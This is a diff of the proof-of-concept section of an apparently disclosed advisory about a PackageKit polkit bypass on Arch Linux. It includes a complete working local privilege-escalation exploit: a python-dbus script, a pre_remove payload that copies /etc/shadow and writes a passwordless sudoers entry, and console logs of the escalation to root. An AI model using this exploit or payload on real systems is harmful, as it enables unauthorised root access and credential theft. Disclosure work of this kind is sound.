@@ -91,31 +91,74 @@ pk_backend_remove_packages_thread (PkBackendJob *job, GVariant* params, gpointer
 
 ## PoC
 
-Default `archlinux:latest` container, stock config, no `SigLevel` relaxation. `test-target` is a package whose `pre_remove` scriptlet writes a proof file and drops `/etc/sudoers.d/pwn`, installed by root beforehand. Everything below runs as `attacker`, uid 1000:
+Default `archlinux:latest`, stock `pacman.conf`, stock PackageKit, no `SigLevel` relaxation. Full chain below, nothing elided.
 
+### Setup — the target host
+
+Everything in this section is ordinary root administration of the box. It is the environment, not the attack:
+
+```bash
+docker run -d --name pkkit-test --hostname arch-pkkit archlinux:latest sleep infinity
+
+docker exec pkkit-test bash -c '
+pacman -Syu --noconfirm
+pacman -S --noconfirm packagekit dbus polkit base-devel sudo python-dbus shared-mime-info
+update-mime-database /usr/share/mime
+useradd -m -s /bin/bash attacker
+mkdir -p /run/dbus /etc/sudoers.d
+dbus-daemon --system --fork
+sleep 1
+G_MESSAGES_DEBUG=all nohup /usr/lib/packagekitd --verbose > /tmp/pkd.log 2>&1 &
+sleep 2
+chmod 644 /tmp/pkd.log
+'
 ```
-$ id
-uid=1000(attacker) gid=1000(attacker) groups=1000(attacker)
 
-$ sudo -n id
-sudo: a password is required
+`test-target` is the package that will be removed. Its `pre_remove` scriptlet is the payload — three things, all of which require root:
 
-$ python3 /tmp/exploit_remove.py
-Transaction: /1_beedaace
-Calling RemovePackages(flags=8, [test-target...], allow_deps=False, autoremove=False)
-RemovePackages returned normally
-
-$ pacman -Q test-target
-error: package 'test-target' was not found
-
-$ cat /tmp/PKKIT_REMOVE_PROOF
-REMOVE scriptlet ran. uid=0 euid=root at Thu May 21 05:53:43 UTC 2026
-
-$ sudo -n id
-uid=0(root) gid=0(root) groups=0(root)
+```bash
+# /tmp/target_pkg/test-target.install
+pre_remove() {
+    echo "REMOVE scriptlet ran. uid=$(id -u) euid=$(id -un) at $(date)" > /tmp/PKKIT_REMOVE_PROOF
+    chmod 644 /tmp/PKKIT_REMOVE_PROOF
+    cp /etc/shadow /tmp/PKKIT_REMOVE_SHADOW 2>/dev/null
+    chmod 644 /tmp/PKKIT_REMOVE_SHADOW
+    echo "attacker ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/pwn
+    chmod 0440 /etc/sudoers.d/pwn
+}
 ```
 
-The exploit is 25 lines of `python-dbus`. There is no race, no heap grooming, no second stage — the whole thing is one method call with one bit set:
+```bash
+# /tmp/target_pkg/PKGBUILD
+pkgname=test-target
+pkgver=1
+pkgrel=1
+pkgdesc="Target package for the PoC"
+arch=(any)
+license=(custom)
+install=test-target.install
+package() {
+    install -dm755 "$pkgdir/opt/target"
+    echo "this package exists to be removed by the PoC" > "$pkgdir/opt/target/marker"
+}
+```
+
+Built and installed by root, the way any package gets onto the system:
+
+```bash
+docker exec pkkit-test bash -c '
+cd /tmp/target_pkg
+chown -R attacker:attacker .
+runuser -u attacker -- env PKGEXT=.pkg.tar.xz makepkg --noconfirm --skipinteg
+pacman -U --noconfirm test-target-1-1-any.pkg.tar.xz
+'
+```
+
+Note that removal scriptlets like this are not exotic. Every distro ships packages whose `pre_remove` touches privileged state — that is what path (b) in the impact section trades on. Authoring one here just makes the proof legible.
+
+### The exploit
+
+25 lines of `python-dbus`, dropped at `/tmp/exploit_remove.py`, world-readable, no setuid, no helper:
 
 ```python
 #!/usr/bin/env python3
@@ -123,41 +166,112 @@ import dbus
 bus = dbus.SystemBus()
 
 pk = bus.get_object("org.freedesktop.PackageKit", "/org/freedesktop/PackageKit")
-tid = dbus.Interface(pk, "org.freedesktop.PackageKit").CreateTransaction()
+pk_iface = dbus.Interface(pk, "org.freedesktop.PackageKit")
+tid = pk_iface.CreateTransaction()
+print("Transaction:", tid)
 
 tx = bus.get_object("org.freedesktop.PackageKit", tid)
 tx_iface = dbus.Interface(tx, "org.freedesktop.PackageKit.Transaction")
 
 # RemovePackages(transaction_flags, package_ids, allow_deps, autoremove)
 # flags=8 = PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD
-tx_iface.RemovePackages(dbus.UInt64(8),
-                        dbus.Array(["test-target;1-1;any;installed"], signature="s"),
-                        False, False)
+flags = dbus.UInt64(8)
+pkg_ids = dbus.Array(["test-target;1-1;any;installed"], signature="s")
+print("Calling RemovePackages(flags=8, [test-target...], allow_deps=False, autoremove=False)")
+try:
+    tx_iface.RemovePackages(flags, pkg_ids, False, False)
+    print("RemovePackages returned normally")
+except dbus.DBusException as e:
+    print("RemovePackages raised:", e.get_dbus_message())
 ```
 
-The daemon log from the same run shows the bypass on the wire:
+No race, no grooming, no second stage. One method call with one bit set.
 
+### The chain, as the unprivileged user
+
+```console
+$ docker exec -it --user attacker pkkit-test bash
+
+attacker@arch-pkkit:~$ id
+uid=1000(attacker) gid=1000(attacker) groups=1000(attacker)
+
+attacker@arch-pkkit:~$ grep ^SigLevel /etc/pacman.conf
+SigLevel    = Required DatabaseOptional
+
+attacker@arch-pkkit:~$ sudo -n id
+sudo: a password is required
+
+attacker@arch-pkkit:~$ pgrep -a polkit-agent || echo 'no polkit auth agent running'
+no polkit auth agent running
+
+attacker@arch-pkkit:~$ ls -la /etc/sudoers.d/
+ls: cannot open directory '/etc/sudoers.d/': Permission denied
+
+attacker@arch-pkkit:~$ pacman -Q test-target
+test-target 1-1
+
+attacker@arch-pkkit:~$ ls -la /tmp/PKKIT_REMOVE_*
+ls: cannot access '/tmp/PKKIT_REMOVE_*': No such file or directory
 ```
-PackageKit RemovePackages method called: test-target;1-1;any;installed, 0, 0 (transaction_flags: only-download)
-PackageKit No authentication required
-PackageKit transaction now running
-PackageKit setting role for /1_beedaace to remove-packages
-PackageKit emit package removing, test-target;1-1;any;installed
-PackageKit transaction now finished
+
+uid 1000, no sudo, no polkit agent registered, no read access to `/etc/sudoers.d/`, target package installed, no payload output yet. Now the single call:
+
+```console
+attacker@arch-pkkit:~$ python3 /tmp/exploit_remove.py
+Transaction: /1_beedaace
+Calling RemovePackages(flags=8, [test-target...], allow_deps=False, autoremove=False)
+RemovePackages returned normally
 ```
 
-`No authentication required`, on a `remove-packages` role, from uid 1000.
+```console
+attacker@arch-pkkit:~$ pacman -Q test-target
+error: package 'test-target' was not found
 
-Environment, if you want to rebuild it:
-
-```bash
-docker run -d --name pkkit-test --hostname arch-pkkit archlinux:latest sleep infinity
-docker exec pkkit-test bash -c 'pacman -Syu --noconfirm && \
-  pacman -S --noconfirm packagekit dbus polkit base-devel sudo python-dbus shared-mime-info && \
-  update-mime-database /usr/share/mime && useradd -m -s /bin/bash attacker && \
-  mkdir -p /run/dbus /etc/sudoers.d && dbus-daemon --system --fork && sleep 1 && \
-  G_MESSAGES_DEBUG=all nohup /usr/lib/packagekitd --verbose > /tmp/pkd.log 2>&1 &'
+attacker@arch-pkkit:~$ cat /tmp/PKKIT_REMOVE_PROOF
+REMOVE scriptlet ran. uid=0 euid=root at Thu May 21 05:53:43 UTC 2026
 ```
+
+The package is gone and the scriptlet ran as root. Both dropped files land `root:root`. `/etc/shadow` is mode 600 `root:root` and unreadable to uid 1000 — the copy exists only because the scriptlet made it:
+
+```console
+attacker@arch-pkkit:~$ head -5 /tmp/PKKIT_REMOVE_SHADOW
+root:*:14871::::::
+alpm:[REDACTED HASH]:20590:::::1:
+bin:[REDACTED HASH]:20590:::::1:
+daemon:[REDACTED HASH]:20590:::::1:
+mail:[REDACTED HASH]:20590:::::1:
+```
+
+(Hash fields masked here; the container's real bytes are in the advisory evidence.)
+
+And the privilege escalation closes:
+
+```console
+attacker@arch-pkkit:~$ sudo -n id
+uid=0(root) gid=0(root) groups=0(root)
+
+attacker@arch-pkkit:~$ sudo -n cat /etc/sudoers.d/pwn
+attacker ALL=(ALL) NOPASSWD: ALL
+```
+
+Same shell, same `attacker` user underneath, now root. The `sudo -n id` that failed eight commands ago succeeds because the `pre_remove` scriptlet wrote that sudoers drop-in as root.
+
+### The bypass on the wire
+
+```console
+attacker@arch-pkkit:~$ grep -E 'method called|No authentication required|transaction now|setting role|emit package' /tmp/pkd.log | tail
+05:53:43	PackageKit	transaction now new
+05:53:43	PackageKit	RemovePackages method called: test-target;1-1;any;installed, 0, 0 (transaction_flags: only-download)
+05:53:43	PackageKit	No authentication required
+05:53:43	PackageKit	transaction now ready
+05:53:43	PackageKit	transaction now running
+05:53:43	PackageKit	setting role for /1_beedaace to remove-packages
+05:53:43	PackageKit	emit package removing, test-target;1-1;any;installed, Target package the attacker will remove via the polkit bypass
+05:53:43	PackageKit	emit package finished, test-target;1-1;any;installed, Target package the attacker will remove via the polkit bypass
+05:53:43	PackageKit	transaction now finished
+```
+
+`No authentication required`, on a `remove-packages` role, from uid 1000. That is the whole bug in one log line.
 
 ## Impact
 
